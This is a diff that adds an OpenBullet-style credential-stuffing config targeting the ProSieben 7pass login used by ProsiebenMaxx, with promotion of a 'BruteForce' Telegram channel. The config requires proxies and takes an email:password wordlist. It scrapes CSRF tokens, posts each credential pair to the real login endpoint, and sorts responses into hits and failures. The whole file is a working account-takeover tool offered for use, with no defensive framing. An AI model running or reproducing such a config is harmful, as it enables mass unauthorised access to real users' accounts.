@@ -1,0 +1,72 @@
+[SETTINGS]
+{
+  "Name": "ProsiebenMaxx",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-14T01:16:37.750745+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | No Capture",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CSRF REQUEST GET "https://op.7pass.de/auth?response_type=code&client_id=59f086cce56b4b075a196ef6&scope=openid+profile+email+offline_access&redirect_uri=https%3A%2F%2Fsso.prosiebenmaxx.de%2Fusers%2Fauth%2Fcallback&prompt=consent&claims=%7B%22id_token%22%3A%7B%22created_at%22%3Anull%2C%22amr%22%3Anull%7D%7D&cd50=de&no_session=login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
+  HEADER "Host: op.7pass.de" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#CSRF PARSE "<SOURCE>" LR "meta name=\"csrf-param\" content=\"" "\" />" -> VAR "CSRF" 
+
+#Tok REQUEST GET "https://interaction.7pass.de/dc0e8439-bfed-42a5-b043-c2d452bffe23/login" 
+  
+  HEADER "Host: interaction.7pass.de" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
+  HEADER "Referer: https://interaction.7pass.de/dc0e8439-bfed-42a5-b043-c2d452bffe23" 
+
+#Tok PARSE "<SOURCE>" LR "meta name=\"csrf-token\" content=\"" "\" />" -> VAR "Tok" 
+
+#LOGIN REQUEST POST "https://interaction.7pass.de/dc0e8439-bfed-42a5-b043-c2d452bffe23/login" 
+  CONTENT "<CSRF>=<Tok>&email=<USER>&password=<PASS>&remember=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: interaction.7pass.de" 
+  HEADER "Origin: https://interaction.7pass.de" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" 
+  HEADER "Referer: https://interaction.7pass.de/dc0e8439-bfed-42a5-b043-c2d452bffe23/login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Bitte geben Sie Ihre gültige E-Mail-Adresse oder Ihr Passwort ein" 
+  KEYCHAIN Success OR 
+    KEY "Weiter" 
+
+#CC FUNCTION Constant "T.me/BruteForce " -> CAP " Telegram Channel: " 
+
